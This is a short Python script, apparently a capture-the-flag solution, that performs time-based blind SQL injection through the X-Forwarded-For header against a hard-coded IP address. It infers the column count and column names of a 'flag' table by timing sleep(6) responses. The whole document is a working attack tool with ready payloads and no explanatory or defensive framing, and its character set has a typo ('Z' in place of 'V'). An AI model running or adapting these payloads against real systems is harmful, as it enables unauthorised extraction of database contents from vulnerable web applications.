import requests

dic='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_-+=@%^&.'
url = 'http://123.206.87.240:8002/web15/'

target_db = 'web15'
target_tb = 'flag'

payload_col_num = "1'+(select case when (select count(*) from information_schema.COLUMNS where TABLE_SCHEMA='{0}' and TABLE_NAME='{1}') = '{2}' then sleep(6) else 1 end)+'1"
payload_col_len = "1'+(select case when (select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA='{0}' and TABLE_NAME='{1}' limit 1 offset {2}) = '{3}' then sleep(6) else 1 end)+'1"
payload_col_name = "1'+(select case when (substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='{0}' and TABLE_NAME='{1}' limit 1 offset {2}) from {3} for 1)) = '{4}' then sleep(6) else 1 end)+'1"

col_num = 0
def get_col_num():
    global col_num
    for i in range(50):
        try:
            headers = {'x-forwarded-for': payload_col_num.format(target_db, target_tb, i)}
            res = requests.get(url, headers=headers, timeout=5)
        except requests.exceptions.ReadTimeout:
            col_num = i
            break
    print('col_num = ' + str(col_num))


def get_col_name():
    len = 0
    for i in range(col_num):
        for j in range(50):
            try:
                headers = {'x-forwarded-for': payload_col_len.format(target_db, target_tb, i, j)}
                res = requests.get(url, headers=headers, timeout=5)
            except requests.exceptions.ReadTimeout:
                len = j
                print("No." + str(i + 1) + "column's length : " + str(len))
                break
        col_name = ''
        for k in range(1, len + 1):
            for j in dic:
                try:
                    headers = {'x-forwarded-for': payload_col_name.format(target_db, target_tb, i, k, j)}
                    res = requests.get(url, headers=headers, timeout=5)
                except requests.exceptions.ReadTimeout:
                    col_name += j
                    print(col_name)
                    break


get_col_num()
get_col_name()